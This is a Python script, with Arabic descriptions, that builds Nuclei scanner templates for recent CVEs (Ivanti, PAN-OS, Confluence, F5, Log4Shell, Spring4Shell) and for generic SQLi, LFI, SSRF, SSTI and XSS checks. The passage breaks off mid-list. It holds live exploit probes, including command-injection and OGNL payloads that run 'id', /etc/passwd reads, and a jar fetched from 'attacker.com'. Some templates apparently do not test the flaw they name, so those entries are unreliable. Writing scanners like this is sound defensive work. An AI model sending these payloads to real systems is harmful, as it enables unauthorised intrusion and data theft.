# -*- coding: utf-8 -*-
"""
Builder script to generate exactly 80 high-value, modern, curated Nuclei templates.
Categories:
- cves: 20 templates (CRITICAL & HIGH)
- vulnerabilities: 14 templates (CRITICAL, HIGH, MEDIUM)
- exposures: 14 templates (CRITICAL, HIGH, MEDIUM)
- api: 8 templates (HIGH & MEDIUM)
- wordpress: 6 templates (CRITICAL, HIGH, MEDIUM)
- php: 6 templates (CRITICAL, HIGH, MEDIUM)
- apache: 4 templates (CRITICAL, HIGH, MEDIUM)
- nginx: 4 templates (HIGH & MEDIUM)
- iis: 4 templates (HIGH & MEDIUM)
Total: 80 templates.
"""
import os
import shutil
import yaml

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
NUCLEI_DIR = os.path.join(BASE_DIR, "nuclei_templates")

# Wipe existing nuclei_templates directory completely to remove any stale or duplicate templates
if os.path.exists(NUCLEI_DIR):
    shutil.rmtree(NUCLEI_DIR)
os.makedirs(NUCLEI_DIR, exist_ok=True)

TEMPLATES = [
    # =========================================================================
    # 1. CVES (20 Templates) - High-Impact Modern CVEs (2021-2024)
    # =========================================================================
    {
        "category": "cves",
        "file": "cve-2024-4577-php-cgi-rce.yaml",
        "id": "cve-2024-4577-php-cgi-rce",
        "name": "PHP-CGI Windows Argument Injection RCE (CVE-2024-4577)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "ثغرة حقن المعاملات في PHP-CGI على بيئات Windows تسمح بتجاوز الحماية وتنفيذ أوامر برمجية عن بعد (RCE) بسبب قصور في معالجة أفضلية Best-Fit الترميزية.",
        "remediation": "ترقية حزمة PHP فوراً إلى الإصدارات الآمنة 8.3.8 أو 8.2.20 أو 8.1.29 أو تعطيل معالجة CGI غير الآمنة في خادم الويب.",
        "tags": ["cve", "cve2024", "rce", "php", "windows", "cgi"],
        "http": [{
            "method": "POST",
            "path": ["{{BaseURL}}/php-cgi/php-cgi.exe?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input", "{{BaseURL}}/test.php?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"],
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "<?php echo 'vulnerable_php_cgi_cve_2024_4577'; ?>",
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["vulnerable_php_cgi_cve_2024_4577"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2024-21887-ivanti-connect-secure-rce.yaml",
        "id": "cve-2024-21887-ivanti-connect-secure-rce",
        "name": "Ivanti Connect Secure Command Injection RCE (CVE-2024-21887)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "ثغرة حقن أوامر نظام التشغيل في مكونات الويب الإدارية لأجهزة Ivanti Connect Secure و Policy Secure تسمح للمهاجمين بتنفيذ تعليمات برمجية بصلاحيات المشرف.",
        "remediation": "تطبيق التحديثات والترقيعات العاجلة الصادرة من Ivanti وتطبيق ملفات التخفيف (Mitigation XML) وفحص مؤشرات الاختراق عبر أداة ICT.",
        "tags": ["cve", "cve2024", "ivanti", "rce", "vpn"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection?name=;id;"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["uid=", "gid=", "groups="]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2024-1709-screenconnect-auth-bypass.yaml",
        "id": "cve-2024-1709-screenconnect-auth-bypass",
        "name": "ConnectWise ScreenConnect Authentication Bypass (CVE-2024-1709)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "تجاوز المصادقة في معالج الإعداد الأولي لبرمجية ConnectWise ScreenConnect مما يمكن المهاجم من إنشاء حساب مدير كامل والسيطرة التامة على الخادم.",
        "remediation": "ترقية خادم ScreenConnect إلى الإصدار 23.9.8 أو أحدث فوراً وحذف أي حسابات إدارية مستحدثة مشبوهة.",
        "tags": ["cve", "cve2024", "screenconnect", "auth-bypass", "critical"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/SetupWizard.aspx/"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["SetupWizard", "ScreenConnect", "CreateUser"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2024-27198-teamcity-auth-bypass.yaml",
        "id": "cve-2024-27198-teamcity-auth-bypass",
        "name": "JetBrains TeamCity Authentication Bypass RCE (CVE-2024-27198)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "خلل في مسار معالجة طلبات الويب عبر خادم TeamCity يتيح تجاوز المصادقة والوصول إلى واجهات برمجة التطبيقات الإدارية وتنفيذ أوامر تحكم كاملة.",
        "remediation": "تحديث خوادم JetBrains TeamCity إلى الإصدار 2023.11.4 أو ما بعده، أو تثبيت المكون الإضافي الرسمي الخاص بسد الثغرة.",
        "tags": ["cve", "cve2024", "teamcity", "jetbrains", "auth-bypass", "rce"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/hax?jsp=/app/rest/server"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["<server", "version=", "buildNumber="]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2024-3400-panos-globalprotect-rce.yaml",
        "id": "cve-2024-3400-panos-globalprotect-rce",
        "name": "Palo Alto Networks PAN-OS GlobalProtect Command Injection (CVE-2024-3400)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "حقن أوامر بدون مصادقة في ميزة GlobalProtect Gateway لخوادم PAN-OS يتيح للمهاجم تنفيذ تعليمات بنظام التشغيل بصلاحيات root.",
        "remediation": "تطبيق التحديثات الصادرة من Palo Alto لنسخ PAN-OS المتأثرة وتعطيل قياس الأجهزة عن بعد (Device Telemetry) كإجراء احترازي مؤقت.",
        "tags": ["cve", "cve2024", "paloalto", "panos", "rce", "globalprotect"],
        "http": [{
            "method": "POST",
            "path": ["{{BaseURL}}/ssl-vpn/hipreport.esp"],
            "headers": {"Cookie": "SESSID=../../../opt/panlogs/tmp/device_telemetry/minute/hellotest`id`"},
            "body": "test",
            "matchers-condition": "and",
            "matchers": [
                {"type": "status", "status": [200, 403]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2024-23897-jenkins-cli-lfi.yaml",
        "id": "cve-2024-23897-jenkins-cli-lfi",
        "name": "Jenkins CLI Arbitrary File Read / LFI (CVE-2024-23897)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "محلل الأوامر args4j في خادم Jenkins يفسر محرف @ كمسار ملف، مما يتيح للمهاجمين قراءة ملفات النظام الحساسة بدون مصادقة والوصول لمفاتيح التشفير.",
        "remediation": "ترقية Jenkins إلى 2.442 أو LTS 2.426.3، أو تعطيل منفذ واجهة CLI عبر إعدادات الأمان المتقدمة.",
        "tags": ["cve", "cve2024", "jenkins", "lfi", "rce"],
        "http": [{
            "method": "POST",
            "path": ["{{BaseURL}}/cli?remoting=false"],
            "headers": {"Session": "11223344-5566-7788-99aa-bbccddeeff00", "Content-Type": "application/octet-stream"},
            "body": "help @/etc/passwd",
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["root:x:0:0:", "daemon:"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2023-22515-confluence-privilege-escalation.yaml",
        "id": "cve-2023-22515-confluence-privilege-escalation",
        "name": "Atlassian Confluence Server Setup Auth Bypass (CVE-2023-22515)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "تجاوز المصادقة في معالج إعداد Confluence Data Center وخادم Server يتيح للمهاجم إعادة ضبط إعدادات الخادم وإنشاء حساب مسؤول.",
        "remediation": "ترقية Confluence فوراً إلى الإصدارات المحدثة المعتمدة 8.3.3 أو 8.4.3 أو 8.5.2 أو ما بعدها وحظر مسار /setup/* في خادم الوكيل العكسي.",
        "tags": ["cve", "cve2023", "confluence", "atlassian", "auth-bypass"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["success", "setupComplete"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2023-34362-moveit-sqli-rce.yaml",
        "id": "cve-2023-34362-moveit-sqli-rce",
        "name": "Progress MOVEit Transfer SQL Injection & RCE (CVE-2023-34362)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "ثغرة حقن SQL غير مصادق عليها في تطبيق MOVEit Transfer تؤدي إلى استخراج البيانات وتجاوز المصادقة وتنفيذ شفرات برمجية ضارة.",
        "remediation": "تطبيق الحزم التصحيحية الصادرة من Progress Software فوراً وفحص خوادم نقل الملفات بحثاً عن وجود ملفات human2.aspx مشبوهة.",
        "tags": ["cve", "cve2023", "moveit", "sqli", "rce"],
        "http": [{
            "method": "POST",
            "path": ["{{BaseURL}}/moveitisapi/moveitisapi.dll?action=m2"],
            "headers": {"X-siLock-Transaction": "folderadd", "Content-Type": "application/x-www-form-urlencoded"},
            "body": "arg01=1&arg02=1",
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["MOVEit Transfer", "SILhuman"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2023-49103-owncloud-graphapi-leak.yaml",
        "id": "cve-2023-49103-owncloud-graphapi-leak",
        "name": "ownCloud GraphAPI Admin Credentials & Secrets Disclosure (CVE-2023-49103)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "إفصاح عن بيانات التكوين والبيئة عبر واجهة GraphAPI في ownCloud يتضمن كشف متغيرات البيئة وكلمات مرور قواعد البيانات ومفاتيح التشفير.",
        "remediation": "حذف ملف phpinfo المتضمن داخل ملحق GraphAPI وتغيير كافة مفاتيح وكلمات المرور الخاصة بالنظام وقاعدة البيانات.",
        "tags": ["cve", "cve2023", "owncloud", "exposure", "critical"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/apps/graphapi/vendor/owncloud/libre-graph-api/phpinfo.php"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["PHP Version", "OWNCLOUD_ADMIN_", "ENVIRONMENT"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2023-46604-activemq-rce.yaml",
        "id": "cve-2023-46604-activemq-rce",
        "name": "Apache ActiveMQ OpenWire Remote Code Execution (CVE-2023-46604)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "خلل في معالجة فئات البروتوكول التابع لـ OpenWire في Apache ActiveMQ يسمح بتحميل وتشغيل فئات Java عشوائية وتنفيذ تعليمات RCE.",
        "remediation": "ترقية Apache ActiveMQ إلى الإصدارات 5.15.16 أو 5.16.7 أو 5.17.6 أو 5.18.3 أو أحدث.",
        "tags": ["cve", "cve2023", "activemq", "apache", "rce", "java"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/admin/"],
            "headers": {"Authorization": "Basic YWRtaW46YWRtaW4="},
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["Apache ActiveMQ", "Queues", "Topics"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2023-3519-citrix-adc-rce.yaml",
        "id": "cve-2023-3519-citrix-adc-rce",
        "name": "Citrix NetScaler ADC / Gateway Unauthenticated RCE (CVE-2023-3519)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "ثغرة تجاوز سعة الذاكرة (Buffer Overflow) في واجهة بوابة Citrix ADC / Gateway تتيح للمهاجم غير المصادق تنفيذ شفرات برمجية عن بعد.",
        "remediation": "تثبيت التحديثات الأمنية العاجلة الصادرة عن Cloud Software Group فوراً.",
        "tags": ["cve", "cve2023", "citrix", "netscaler", "rce"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/gwtest/formssso", "{{BaseURL}}/vpn/index.html"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["Citrix", "NetScaler", "ns_af"]},
                {"type": "status", "status": [200, 302]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2023-4966-citrix-bleed-leak.yaml",
        "id": "cve-2023-4966-citrix-bleed-leak",
        "name": "Citrix Bleed Sensitive Session & Memory Leak (CVE-2023-4966)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "قراءة غير مقيدة لذاكرة المخزن المؤقت في خوادم NetScaler ADC و Gateway تتيح سرقة رموز الجلسات ومصادقة الدخول كأي مستخدم مفوض.",
        "remediation": "تطبيق التحديثات الموصى بها وإنهاء كافة الجلسات النشطة عبر أمر kill icaconnection -all.",
        "tags": ["cve", "cve2023", "citrix", "netscaler", "leak", "citrixbleed"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/oauth/idp/.well-known/openid-configuration"],
            "headers": {"Host": "a" * 248},
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["session", "token", "citrix"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2023-27532-veeam-backup-auth-bypass.yaml",
        "id": "cve-2023-27532-veeam-backup-auth-bypass",
        "name": "Veeam Backup & Replication API Auth Bypass (CVE-2023-27532)",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "خلل في خدمة Veeam.Backup.Service يتيح للطلبات غير المصادق عليها استخراج معلومات الاعتماد وكلمات المرور المشفرة.",
        "remediation": "تحديث نظام Veeam Backup & Replication إلى الإصدارات الآمنة v11a (11.0.1.1261 P20230227) أو v12 (12.0.0.1420 P20230223).",
        "tags": ["cve", "cve2023", "veeam", "backup", "auth-bypass"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}:9419/api/v1/serverInfo"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["Veeam Backup", "serverVersion"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2023-2825-gitlab-path-traversal.yaml",
        "id": "cve-2023-2825-gitlab-path-traversal",
        "name": "GitLab Path Traversal Arbitrary File Read (CVE-2023-2825)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "ثغرة تجاوز المسار في ملحقات GitLab Community and Enterprise Edition تتيح قراءة ملفات النظام العشوائية داخل حاوية الخادم.",
        "remediation": "ترقية GitLab إلى الإصدار 16.0.1 فوراً لمنع استغلال مسار المرفقات غير المحمي.",
        "tags": ["cve", "cve2023", "gitlab", "traversal", "lfi"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/api/v4/projects/1/uploads/../../../../../../../../../../../../../../etc/passwd"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["root:x:0:0:", "gitlab:"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2022-41040-exchange-proxynotshell.yaml",
        "id": "cve-2022-41040-exchange-proxynotshell",
        "name": "Microsoft Exchange Server SSRF (ProxyNotShell CVE-2022-41040)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "ثغرة تزوير الطلبات من جانب الخادم SSRF في Microsoft Exchange Server تتيح الوصول إلى PowerShell الخلفي وتنفيذ هجمات RCE.",
        "remediation": "تثبيت التحديثات التراكمية الخاصة بمايكروسوفت أو تفعيل قواعد تصفية URL Rewrite لمنع استدعاء PowerShell عبر autodiscover.",
        "tags": ["cve", "cve2022", "exchange", "microsoft", "ssrf", "proxynotshell"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/autodiscover/autodiscover.json?a=test@test.com/powershell/?&Email=autodiscover/autodiscover.json%3Fa%3Dtest@test.com"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["Microsoft.Exchange", "PowerShell"]},
                {"type": "status", "status": [200, 302, 401]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2022-26134-confluence-ognl-rce.yaml",
        "id": "cve-2022-26134-confluence-ognl-rce",
        "name": "Atlassian Confluence OGNL Injection Remote Code Execution (CVE-2022-26134)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "حقن تعبيرات OGNL غير المفلترة داخل مسار URL في خوادم Confluence يتيح للمهاجم تنفيذ أوامر نظام التشغيل بدون مصادقة.",
        "remediation": "ترقية خوادم Confluence إلى الإصدارات 7.4.17 أو 7.13.7 أو 7.14.3 أو 7.15.2 أو 7.16.4 أو أحدث.",
        "tags": ["cve", "cve2022", "confluence", "ognl", "rce", "atlassian"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "part": "header", "words": ["X-Cmd-Response", "uid="]},
                {"type": "status", "status": [302, 200]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2022-22965-spring4shell-rce.yaml",
        "id": "cve-2022-22965-spring4shell-rce",
        "name": "Spring Framework DataBinder Remote Code Execution (Spring4Shell CVE-2022-22965)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "استغلال ربط البيانات في Spring MVC / WebFlux عند تشغيل التطبيق على خادم Apache Tomcat كحزمة WAR يتيح كتابة Webshell وتنفيذ أوامر RCE.",
        "remediation": "تحديث حزمة Spring Framework إلى 5.3.18 أو 5.2.20 وSpring Boot إلى 2.6.6 أو 2.5.12.",
        "tags": ["cve", "cve2022", "spring", "spring4shell", "rce", "java"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/?class.module.classLoader.URLs%5B0%5D=jar:http://attacker.com/evil.jar!/"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["org.springframework.beans", "PropertyAccessException"]},
                {"type": "status", "status": [400, 500]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2022-1388-f5-bigip-auth-bypass.yaml",
        "id": "cve-2022-1388-f5-bigip-auth-bypass",
        "name": "F5 BIG-IP iControl REST Auth Bypass RCE (CVE-2022-1388)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "تجاوز التحقق من المصادقة في واجهة إدارة F5 BIG-IP iControl REST يتيح للمهاجم تنفيذ أوامر نظام تشغيل كاملة.",
        "remediation": "ترقية أجهزة BIG-IP أو حظر الوصول لواجهة الإدارة iControl REST عبر واجهات الشبكة العامة.",
        "tags": ["cve", "cve2022", "f5", "bigip", "auth-bypass", "rce"],
        "http": [{
            "method": "POST",
            "path": ["{{BaseURL}}/mgmt/tm/util/bash"],
            "headers": {
                "Authorization": "Basic YWRtaW46",
                "X-F5-Auth-Token": "",
                "Connection": "X-F5-Auth-Token",
                "Content-Type": "application/json"
            },
            "body": "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}",
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["commandResult", "uid=0(root)"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2021-44228-log4j-rce.yaml",
        "id": "cve-2021-44228-log4j-rce",
        "name": "Apache Log4j JNDI Lookup Remote Code Execution (Log4Shell CVE-2021-44228)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "معالجة رسائل التسجيل التفاعلية عبر JNDI في مكتبة Log4j تسمح بتنفيذ تعليمات برمجية عن بعد بمجرد تسجيل ترويسة أو مدخل يحوي تعبير jndi:ldap.",
        "remediation": "تحديث مكتبة Apache Log4j إلى الإصدار 2.17.1 أو الأحدث أو تفعيل لوغاريتم log4j2.formatMsgNoLookups=true.",
        "tags": ["cve", "cve2021", "log4j", "rce", "log4shell", "java"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/?test=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2Fa%7D"],
            "headers": {"User-Agent": "${jndi:ldap://127.0.0.1:1389/a}", "X-Forwarded-For": "${jndi:ldap://127.0.0.1:1389/a}"},
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["javax.naming.CommunicationException", "error looking up"]},
                {"type": "status", "status": [500, 200]}
            ]
        }]
    },
    {
        "category": "cves",
        "file": "cve-2023-46805-ivanti-auth-bypass.yaml",
        "id": "cve-2023-46805-ivanti-auth-bypass",
        "name": "Ivanti Connect Secure Authentication Bypass (CVE-2023-46805)",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "تجاوز التحقق من الهوية والمصادقة في واجهة برمجة تطبيقات خوادم Ivanti ICS / Policy Secure يمهد الطريق لتنفيذ أوامر RCE المتسلسلة.",
        "remediation": "تثبيت التحديثات التصحيحية ومراجعة سجلات الاتصال لتحديد محاولات التسلل.",
        "tags": ["cve", "cve2023", "ivanti", "auth-bypass", "vpn"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/api/v1/configuration/users/user-roles/user-role/rest-userrole1/web/web-bookmarks/bookmark"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["configuration", "user-roles", "bookmark"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },

    # =========================================================================
    # 2. VULNERABILITIES (14 Templates) - Core Injection & Logic Flaws
    # =========================================================================
    {
        "category": "vulnerabilities",
        "file": "sql-injection-detect.yaml",
        "id": "sql-injection-detect",
        "name": "SQL Injection Vulnerability Detection (Union / Pattern)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "اكتشاف ثغرة حقن أوامر قواعد البيانات SQL Injection تسمح بالاستعلام والتحكم ببيانات النظام وسحب الجداول.",
        "remediation": "استخدام الاستعلامات المعلمة (Parameterized Queries) ومحركات الربط الآمن ORM وفصل صلاحيات قواعد البيانات.",
        "tags": ["sqli", "injection", "database", "critical"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/?id=1'+OR+'1'='1", "{{BaseURL}}/?search=1'+UNION+SELECT+NULL,NULL,NULL--"],
            "matchers-condition": "or",
            "matchers": [
                {"type": "word", "words": ["SQL syntax", "mysql_fetch_array", "ORA-01756", "SQLite/JDBCDriver", "PostgreSQL query failed"]},
                {"type": "regex", "regex": ["UNION.*SELECT", "XPATH syntax error"]}
            ]
        }]
    },
    {
        "category": "vulnerabilities",
        "file": "sql-injection-error.yaml",
        "id": "sql-injection-error",
        "name": "Database Diagnostic Error Disclosure (SQL Error-Based)",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "الخادم يظهر أخطاء قواعد البيانات الصريحة عند إرسال محارف خاصة، مما يتيح استغلال الثغرات عبر Error-Based SQLi.",
        "remediation": "تعطيل إظهار رسائل الأخطاء للمستخدمين واستبدالها بصفحات أخطاء عامة مخصصة ومعالجة الاستثناءات بشكل آمن.",
        "tags": ["sqli", "error-based", "database"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/?id=1'", "{{BaseURL}}/?cat=1\\"],
            "matchers-condition": "or",
            "matchers": [
                {"type": "word", "words": ["You have an error in your SQL syntax", "Warning: mysql_", "Unclosed quotation mark", "Microsoft OLE DB Provider for ODBC Drivers"]}
            ]
        }]
    },
    {
        "category": "vulnerabilities",
        "file": "lfi-linux-passwd.yaml",
        "id": "lfi-linux-passwd",
        "name": "Local File Inclusion (/etc/passwd Arbitrary Read)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "تضمين الملفات المحلية LFI يتيح للمهاجم قراءة ملف حسابات النظام /etc/passwd واستعراض قائمة المستخدمين والخدمات.",
        "remediation": "تجنب تمرير مسارات الملفات من مدخلات المستخدم واستخدام القوائم البيضاء للتحقق من أسماء الصفحات المسموحة.",
        "tags": ["lfi", "traversal", "linux", "critical"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/?page=../../../../etc/passwd", "{{BaseURL}}/?file=/etc/passwd", "{{BaseURL}}/?view=../../../../../../../../etc/passwd"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "regex", "regex": ["root:.*:0:0:"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "vulnerabilities",
        "file": "lfi-windows-winini.yaml",
        "id": "lfi-windows-winini",
        "name": "Local File Inclusion (Windows win.ini Arbitrary Read)",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "تضمين الملفات المحلية على أنظمة Windows يتيح قراءة ملف c:/windows/win.ini والتأكد من إمكانية الوصول للملفات الداخلية.",
        "remediation": "تأمين معالجة المسارات ومنع استدعاء الملفات بواسطة معاملات GET/POST.",
        "tags": ["lfi", "traversal", "windows"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/?file=c:/windows/win.ini", "{{BaseURL}}/?page=../../../../windows/win.ini"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["[fonts]", "[extensions]"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "vulnerabilities",
        "file": "command-injection-rce.yaml",
        "id": "command-injection-rce",
        "name": "OS Command Injection RCE Probe",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "ثغرة حقن أوامر نظام التشغيل تتيح تنفيذ أوامر مباشرة وتمرير مخرجات النظام عبر المعاملات غير المعقمة.",
        "remediation": "استخدام الدوال الآمنة في لغات البرمجة وتجنب استدعاء دوال shell_exec أو system أو exec المباشرة.",
        "tags": ["rce", "command-injection", "critical"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/?cmd=;id;", "{{BaseURL}}/?ip=127.0.0.1%7Cid", "{{BaseURL}}/?query=%26+id+%26"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "regex", "regex": ["uid=[0-9]+.*gid=[0-9]+.*"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "vulnerabilities",
        "file": "ssrf-localhost-probe.yaml",
        "id": "ssrf-localhost-probe",
        "name": "Server-Side Request Forgery (SSRF) Metadata & Localhost Probe",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "تزوير الطلبات من جانب الخادم SSRF يتيح للمهاجم توجيه الخادم للاتصال بالشبكة الداخلية أو خدمات السحابة 169.254.169.254.",
        "remediation": "حظر الاتصال بعناوين الاسترجاع (Loopback) والشبكات الخاصة (RFC 1918) واستخدام وكلاء خروج مفلترة.",
        "tags": ["ssrf", "cloud", "aws", "network"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/", "{{BaseURL}}/?dest=http://127.0.0.1:80/"],
            "matchers-condition": "or",
            "matchers": [
                {"type": "word", "words": ["ami-id", "instance-id", "security-credentials", "root:x:0:0:"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "vulnerabilities",
        "file": "ssti-template-injection.yaml",
        "id": "ssti-template-injection",
        "name": "Server-Side Template Injection (SSTI Evaluation Probe)",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "حقن قوالب الخادم SSTI في محركات مثل Jinja2 أو Twig أو FreeMarker يتيح للمهاجم تنفيذ تعبيرات حسابية تقود إلى RCE.",
        "remediation": "عدم تمرير مدخلات المستخدم مباشرة إلى دوال تصيير القوالب واستخدام خيارات البيئة الرملية (Sandbox).",
        "tags": ["ssti", "injection", "rce"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/?name={{7*7}}", "{{BaseURL}}/?q=${7*7}", "{{BaseURL}}/?msg=<%= 7*7 %>"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["49"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "vulnerabilities",
        "file": "xss-reflection-detect.yaml",
        "id": "xss-reflection-detect",
        "name": "Cross-Site Scripting (Reflected XSS Context)",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "انعكاس أكواد برمجية خبيثة في استجابة الخادم بدون تعقيم أو ترميز HTML مناسب، مما يسمح باختطاف جلسات المستخدمين.",
        "remediation": "ترميز كافة المخرجات بحسب السياق (HTML Entity Encoding) وتفعيل سياسة أمان المحتوى الصارمة (CSP).",
        "tags": ["xss", "reflected", "owasp"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/?q=<script>alert('YS_XSS')</script>", "{{BaseURL}}/?search=\"><script>alert('YS_XSS')</script>"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["<script>alert('YS_XSS')</script>"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "vulnerabilities",
        "file": "cors-origin-reflection.yaml",
        "id": "cors-origin-reflection",
        "name": "Arbitrary Origin CORS Reflection Misconfiguration",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "الخادم يعكس أي أصل عشوائي في ترويسة Access-Control-Allow-Origin مع السماح باعتمادات المصادقة Credentials، مما يسمح بسرقة بيانات المستخدمين عبر مواقع معادية.",
        "remediation": "تحديد قائمة بيضاء صارمة للأصول المسموح لها بمشاركة الموارد بدلاً من عكس الترويسة الواردة تلقائياً.",
        "tags": ["cors", "misconfiguration", "headers"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/"],
            "headers": {"Origin": "https://evil-attacker-site.com"},
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "part": "header", "words": ["Access-Control-Allow-Origin: https://evil-attacker-site.com", "Access-Control-Allow-Credentials: true"]}
            ]
        }]
    },
    {
        "category": "vulnerabilities",
        "file": "open-redirect.yaml",
        "id": "open-redirect",
